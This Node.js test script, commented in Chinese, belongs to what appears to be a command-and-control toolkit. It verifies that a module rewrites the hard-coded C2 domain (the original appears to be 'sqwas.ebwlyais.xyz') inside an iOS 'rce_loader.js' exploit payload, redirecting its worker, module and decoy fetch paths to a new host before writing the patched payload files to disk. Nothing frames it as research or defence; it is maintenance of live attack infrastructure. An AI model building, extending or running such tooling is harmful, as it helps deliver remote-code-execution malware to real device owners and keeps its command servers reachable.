// W-IOS-02 / C2 域名参数化 —— 对照实验（真实模块 + 真实载荷文本）
//   判据1 双份 rce_loader.js sha256 一致性
//   判据2 注入域名 A ⇒ 载荷拉 A；不注入(原域) ⇒ 保持原行为
//   判据3 非法域名 ⇒ 显式报错，且不落任何半成品
import { readFileSync, writeFileSync, mkdtempSync, existsSync, readdirSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { pathToFileURL } from 'node:url';

const MOD = 'E:/USDT项目/02-backend-node/src_restored/plugins/c2/services/chain-darksword.js';
const {
  DS_ORIGIN, patchRules, applyPatchRules, assertValidBase, syncDarkswordPayloads,
} = await import(pathToFileURL(MOD).href);

let failures = 0;
const ok = (c, label, detail) => {
  console.log(`${c ? 'PASS' : 'FAIL'}  ${label}${detail ? '  — ' + detail : ''}`);
  if (!c) failures++;
};
const sha = (p) => crypto.createHash('sha256').update(readFileSync(p)).digest('hex');
const mkTmp = (p) => mkdtempSync(path.join(tmpdir(), p));

// ---------- 判据 1：双份一致性 ----------
const F_05 = 'E:/USDT项目/05-ios/darksword/rce_loader.js';
const F_TP = 'E:/USDT项目/02-backend-node/templates/darksword/rce_loader.js';
const h05 = sha(F_05), htp = sha(F_TP);
ok(h05 === htp, '判据1: 两份 rce_loader.js sha256 一致', `${h05.slice(0, 16)}…`);

const raw = readFileSync(F_TP);
ok(raw.includes(`var localHost = "${DS_ORIGIN}"`), '判据1: 载荷含硬编码 DS_ORIGIN 字面量（注入靶点存在）');

// ---------- 判据 2：对照实验 ----------
const A = 'https://cdn.example-a.test';
const rA = applyPatchRules(raw, A);
const sA = rA.out.toString('utf8');
ok(sA.includes(`${A}/details`), '判据2A: 注入 A ⇒ 载荷 base 指向 A/details');
ok(!sA.includes('sqwas.ebwlyais.xyz'), '判据2A: 原域 sqwas 已从载荷消失');
ok(rA.hits['base-url'] === 1, '判据2A: base-url 命中 1', `hits=${JSON.stringify(rA.hits)}`);
const reqIds = ['base-url', 'worker-186', 'worker-184', 'module-186', 'module-base', 'decoy-404'];
ok(reqIds.every((id) => rA.hits[id] === 1), '判据2A: 入口 6 条必需规则全部命中 1');

const B = 'https://sqwas.ebwlyais.xyz';
const sB = applyPatchRules(raw, B).out.toString('utf8');
ok(sB.includes('https://sqwas.ebwlyais.xyz/details'), '判据2B: 不注入(原域) ⇒ 主机保持原行为');
ok(!sB.includes('/assets'), '判据2B: 路径已切到 /details（行为可预期，非静默）');

// ---------- 判据 3：非法域名 ----------
for (const bad of ['', '   ', 'not a url', 'ftp://x.com', 'javascript:alert(1)', 'https://']) {
  let threw = false;
  try { assertValidBase(bad); } catch { threw = true; }
  ok(threw, `判据3: 非法 base 被拒 ${JSON.stringify(bad)}`);
}
ok(assertValidBase('https://ok.example.test').hostname === 'ok.example.test', '判据3: 合法 base 放行');

// ---------- 判据 3 + 2：syncDarkswordPayloads 端到端 ----------
const srcDir = 'E:/USDT项目/02-backend-node/templates/darksword';

// (a) 非法域名 ⇒ 抛错且不落盘
{
  const store = mkTmp('ds_bad_');
  let err = null;
  try { await syncDarkswordPayloads(srcDir, store, 'not a url', false, null, 'auto'); } catch (e) { err = e.message; }
  ok(!!err, '端到端: 非法域名 ⇒ syncDarkswordPayloads 抛错', err && err.slice(0, 48));
  const leftovers = existsSync(path.join(store, 'payloads')) ? readdirSync(path.join(store, 'payloads')) : [];
  ok(leftovers.length === 0, '端到端: 非法域名 ⇒ 磁盘零产物（无半成品）', `files=${leftovers.length}`);
}

// (b) 正常注入 ⇒ 5 条记录（契约 C-3），且 rce_loader 产物 sha == patched sha
{
  const store = mkTmp('ds_ok_');
  const res = await syncDarkswordPayloads(srcDir, store, A, false, 'cdn.example-a.test', 'auto');
  ok(res.records.length === 5, '端到端: 正常注入 ⇒ 5 条记录（C-3 契约）', `n=${res.records.length}`);
  const patched = applyPatchRules(raw, A).out;
  const rec = res.records.find((r) => r.name === 'ds_rce_loader');
  ok(rec.sha256 === crypto.createHash('sha256').update(patched).digest('hex'), '端到端: rce_loader 产物 sha256 == 注入后内容 sha256');
  const onDisk = existsSync(path.join(store, 'payloads', 'ds_rce_loader.dat'));
  ok(onDisk, '端到端: 正常注入 ⇒ 产物落盘');
}

// (c) 源漂移（靶点消失） ⇒ 必需规则未命中 ⇒ 显式失败且不落盘
{
  const srcBad = mkTmp('ds_src_');
  // ⚠ 不用 cpSync：本机实测 cpSync 复制该目录会静默硬崩（exit 127）。逐文件复制。
  for (const f of readdirSync(srcDir)) {
    const s = path.join(srcDir, f);
    if (statSync(s).isFile()) writeFileSync(path.join(srcBad, f), readFileSync(s));
  }
  const f = path.join(srcBad, 'rce_loader.js');
  writeFileSync(f, readFileSync(f, 'utf8').replace(`"${DS_ORIGIN}"`, '"https://drifted.example/assets"'));
  const store = mkTmp('ds_drift_');
  let err = null;
  try { await syncDarkswordPayloads(srcBad, store, 'https://cdn.example.test', false, null, 'auto'); } catch (e) { err = e.message; }
  ok(!!err && /必需替换点未命中/.test(err), '端到端: 源漂移 ⇒ 显式失败（不静默）', err && err.slice(0, 56));
  const leftovers = existsSync(path.join(store, 'payloads')) ? readdirSync(path.join(store, 'payloads')) : [];
  ok(leftovers.length === 0, '端到端: 源漂移 ⇒ 磁盘零产物（无半成品）', `files=${leftovers.length}`);
}

console.log(failures === 0 ? '\nRESULT: ALL PASS' : `\nRESULT: ${failures} FAILED`);
process.exit(failures === 0 ? 0 : 1);
